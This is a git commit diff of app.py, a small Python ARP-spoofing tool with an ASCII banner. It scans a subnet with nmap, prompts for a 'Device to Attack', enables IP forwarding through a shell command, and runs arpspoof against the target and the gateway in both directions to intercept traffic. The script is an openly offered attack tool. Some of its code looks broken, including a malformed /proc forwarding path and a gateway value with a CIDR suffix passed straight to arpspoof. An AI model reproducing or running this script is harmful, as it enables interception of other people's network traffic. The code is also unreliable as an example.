3cfa1df2b295660bc7443caf06b84421dffff96b
Francesc Castell Portella <56691800+FranckyCastell@users.noreply.github.com>
2022-09-30 20:14:26 +0200

    Update app.py

--- app.py
+++ app.py
@@ -1,27 +1,48 @@
 import os
 import nmap
 
-nm = nmap.nmap.PortScanner()
+nm = nmap.PortScanner()
 
+print ("""
+
+▄▄▄█████▓ ██░ ██ ▓█████   ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  
+▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒
+▒ ▓██░ ▒░▒██▀▀██░▒███   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒
+░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄   ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  
+  ▒██▒ ░ ░▓█▒░██▓░▒████▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒
+  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░
+    ░     ▒ ░▒░ ░ ░ ░  ░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░
+  ░       ░  ░░ ░   ░   ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ 
+          ░  ░  ░   ░  ░      ░               ░ ░      ░ ░             ░  ░   ░     
+                                                                                    
+
+""")
+
+print('')
 gateway = input ('Gateway Ex. 192.168.1.1/24: ') # GATEWAY
 print ('')
 
 print ("Let's Scan Your Network")
 scan_range = nm.scan(hosts=gateway) # SCAN NETWORK
 print(scan_range['scan'])
-print ('')
 
 device = input ('Device to Attack: ') # DEVICE TO ATTACK
-
-print ('Activating IP Forwarding')
-os.system('echo 1 >> /proc/sys/net_ipv4/ip_forward') # IP FORWARDING
-print ('')
 
 network_interface = input('Network Interface to use: ')
 print('')
 
+print("All Ready Let's Start the Atack")
+
+print ('IP Forwarding Activated')
+os.system('echo 1 >> /proc/sys/net_ipv4/ip_forward') # IP FORWARDING
+print ('')
+
 os.system('arpspoof -i ' + network_interface + ' -t ' + device + " " + gateway) # SPOOFING
+print('Atacking Router Completed')
+
 os.system('arpspoof -i ' + network_interface + ' -t ' + gateway + " " + device) # SPOOFING
+print('Atacking Device Completed')
+print('')
 
 print('Do you want to Stop Attack? ')
 print('Press Enter')
